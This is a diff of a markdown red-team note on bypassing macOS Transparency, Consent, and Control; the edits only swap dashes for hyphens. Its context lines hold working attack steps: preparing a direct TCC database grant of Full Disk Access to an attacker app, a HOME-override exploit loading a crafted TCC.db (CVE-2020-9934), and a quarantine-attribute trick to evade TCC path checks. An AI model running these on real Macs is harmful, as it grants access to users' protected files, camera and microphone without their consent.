@@ -2,7 +2,7 @@
 
 Bypass macOS Transparency, Consent, and Control (TCC) to access protected resources without user consent.
 
-**MITRE ATT&CK**: T1548 — Abuse Elevation Control Mechanism
+**MITRE ATT&CK**: T1548 - Abuse Elevation Control Mechanism
 
 ## TCC Service Overview
 
@@ -67,7 +67,7 @@ When SIP is disabled, the TCC database can be written to directly.
 # Check SIP status
 csrutil status
 
-# If disabled — grant FDA to an app
+# If disabled - grant FDA to an app
 BUNDLE_ID="com.attacker.app"
 TIMESTAMP=$(date +%s)
 
@@ -177,21 +177,21 @@ end tell
 
 | CVE | Year | Description | Target |
 |-----|------|-------------|--------|
-| CVE-2023-26818 | 2023 | Telegram FDA bypass — Telegram's TCC grant exploitable via dylib injection | FDA |
-| CVE-2023-32364 | 2023 | Directory Utility bypass — could grant TCC without user consent | Multiple |
+| CVE-2023-26818 | 2023 | Telegram FDA bypass - Telegram's TCC grant exploitable via dylib injection | FDA |
+| CVE-2023-32364 | 2023 | Directory Utility bypass - could grant TCC without user consent | Multiple |
 | CVE-2023-40424 | 2023 | App sandbox escape leading to TCC bypass | Multiple |
 | CVE-2023-38571 | 2023 | Finder copy bypass accessing TCC-protected directories | FDA |
-| CVE-2024-44133 | 2024 | Safari TCC bypass (HM Surf) — modify per-app browser settings in user profile | Camera/Mic/Location |
+| CVE-2024-44133 | 2024 | Safari TCC bypass (HM Surf) - modify per-app browser settings in user profile | Camera/Mic/Location |
 | CVE-2021-30713 | 2021 | XCSSET malware TCC bypass via Zoom or other apps with screen recording | Screen Recording |
 | CVE-2020-9934 | 2020 | HOME environment variable manipulation to load custom TCC.db | All |
 
-### CVE-2020-9934 — HOME Variable Manipulation
+### CVE-2020-9934 - HOME Variable Manipulation
 ```bash
 # Overwrite HOME so TCC reads an attacker-controlled database
 export HOME=/tmp/fakehome
 mkdir -p "/tmp/fakehome/Library/Application Support/com.apple.TCC/"
 cp crafted_tcc.db "/tmp/fakehome/Library/Application Support/com.apple.TCC/TCC.db"
-# Launch app — it reads the fake TCC.db with pre-approved grants
+# Launch app - it reads the fake TCC.db with pre-approved grants
 open /Applications/TargetApp.app
 ```
 *Patched in macOS 11+, but check for regression on older systems.*
@@ -206,7 +206,7 @@ macOS App Translocation moves quarantined apps to a random path. This can interf
 # Force translocation by setting quarantine attribute
 xattr -w com.apple.quarantine "0083;$(printf '%x' $(date +%s));Chrome;$(uuidgen)" /path/to/app.app
 
-# App runs from /private/var/folders/... — TCC path checks may not match
+# App runs from /private/var/folders/... - TCC path checks may not match
 ```
 
 ---
